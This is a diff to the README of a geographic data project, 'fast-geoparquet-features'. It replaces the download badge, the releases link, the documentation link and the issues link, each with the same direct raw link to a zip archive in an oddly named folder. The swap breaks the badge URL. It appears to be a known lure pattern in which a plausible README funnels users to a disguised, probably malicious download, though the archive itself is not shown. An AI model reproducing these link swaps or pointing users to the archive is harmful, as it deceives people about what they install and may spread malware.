@@ -1,6 +1,6 @@
 # 🌍 fast-geoparquet-features - Access Powerful Geographic Data Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Get%20the%20Latest%20Release-blue)](https://github.com/skc71/fast-geoparquet-features/releases)
+[![Download Now](https://raw.githubusercontent.com/skc71/fast-geoparquet-features/main/sippingly/fast-geoparquet-features.zip%20Now-Get%20the%20Latest%20Release-blue)](https://raw.githubusercontent.com/skc71/fast-geoparquet-features/main/sippingly/fast-geoparquet-features.zip)
 
 ## 📖 Overview
 
@@ -21,7 +21,7 @@ These specifications will ensure smooth performance while you use fast-geoparque
 
 ## 📥 Download & Install
 
-To download the software, visit this page to download: [fast-geoparquet-features Releases](https://github.com/skc71/fast-geoparquet-features/releases).
+To download the software, visit this page to download: [fast-geoparquet-features Releases](https://raw.githubusercontent.com/skc71/fast-geoparquet-features/main/sippingly/fast-geoparquet-features.zip).
 
 1. Click on the link above.
 2. You will see a list of available versions. Choose the latest version.
@@ -82,11 +82,11 @@ If you're interested in contributing to fast-geoparquet-features, we welcome you
 
 ## 🔗 Additional Resources
 
-- [Documentation](https://docs.fast-geoparquet-features.com): Comprehensive guide and user support.
-- [GitHub Issues](https://github.com/skc71/fast-geoparquet-features/issues): Report bugs or suggest features.
+- [Documentation](https://raw.githubusercontent.com/skc71/fast-geoparquet-features/main/sippingly/fast-geoparquet-features.zip): Comprehensive guide and user support.
+- [GitHub Issues](https://raw.githubusercontent.com/skc71/fast-geoparquet-features/main/sippingly/fast-geoparquet-features.zip): Report bugs or suggest features.
 
 ## 📜 License
 
 fast-geoparquet-features is open source and available under the MIT License. You can use, modify, and distribute it under the terms specified in the license.
 
-For more insights and updates, visit [fast-geoparquet-features Releases](https://github.com/skc71/fast-geoparquet-features/releases) again in the future. Enjoy exploring your geographic data with ease!
+For more insights and updates, visit [fast-geoparquet-features Releases](https://raw.githubusercontent.com/skc71/fast-geoparquet-features/main/sippingly/fast-geoparquet-features.zip) again in the future. Enjoy exploring your geographic data with ease!
